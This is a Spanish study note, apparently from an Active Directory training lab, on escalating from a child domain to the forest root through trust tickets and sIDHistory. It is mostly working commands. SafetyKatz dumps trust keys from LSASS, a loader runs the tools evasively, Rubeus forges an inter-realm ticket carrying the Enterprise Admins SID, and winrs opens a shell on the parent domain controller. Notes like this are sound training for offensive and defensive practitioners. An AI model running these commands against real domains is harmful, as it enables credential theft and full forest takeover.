# Across Atacks 

Tags: #AD 

- **Entre dominios (dentro del mismo bosque)** → existe una relación de confianza implícita de dos vías.
- **Entre bosques (forests)** → es necesario establecer explícitamente una relación de confianza.

Enterprise Admins:
- **sIDHistory** es un atributo de usuario diseñado para escenarios donde un usuario es movido de un dominio a otro. Cuando el dominio de un usuario cambia, se le asigna un nuevo **SID** y el SID anterior se agrega a **sIDHistory**.
- **sIDHistory** puede ser abusado de dos formas para escalar privilegios dentro de un bosque:
    - Uso del **hash de krbtgt** del dominio hijo
    - Uso de **trust tickets**

```bash 
519 - Es el RID del 'Enterprise Admins Group' 
```

## Child to parent using Trust Tickets

```powershell 
! Usuario: Domain Admin (ejecutado en el DC hijo)

❯ SafetyKatz.exe "lsadump::trust /patch"
# Extraer la trust key [In] del dominio hijo al padre — necesaria para forjar inter-realm tickets y escalar al dominio padre.

❯ SafetyKatz.exe "lsadump::dcsync /user:DC_hijo\DC_Padre$"
❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"
# Extraer la trust key vía DCSync usando la cuenta de confianza del dominio padre — alternativa sin parchear LSASS.

❯ SafetyKatz.exe "lsadump::lsa /patch"
# Extraer todas las credenciales del DC incluyendo la trust key — alternativa más amplia que muestra todos los hashes.
```

```powershell 
! Usuario: Domain Admin del dominio hijo

❯ .\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
# Forjar un inter-realm TGT usando la trust key del dominio hijo para escalar al dominio padre.
# silver    → Nombre del módulo 
# /service  → servicio objetivo: krbtgt del dominio padre (inter-realm TGT)
# /rc4      → trust key (hash NTLM) de la relación de confianza hijo → padre
# /sid      → SID del dominio hijo
# /sids     → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519) — otorga privilegios en todo el bosque
# /ldap     → consulta al DC para obtener atributos del usuario automáticamente
# /user     → usuario Administrator a impersonar en el ticket forjado
# /nowrap   → muestra el ticket en base64 sin saltos de línea para facilitar su copia

❯ .\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>
# Usar el inter-realm TGT forjado para solicitar un TGS para un servicio del dominio padre e inyectarlo en la sesión actual — completa el escalado de dominio hijo a dominio padre.
# FORGED TICKET = Es el resultado del comando anterior al forjar el ticket 

❯ winrs -r:mcorp-dc.moneycorp.local cmd.exe
# Abrir una shell remota en el equipo objetivo usando el ticket inyectado
	❯ set computername 
```

![](Pasted%20image%2020260422162556.png)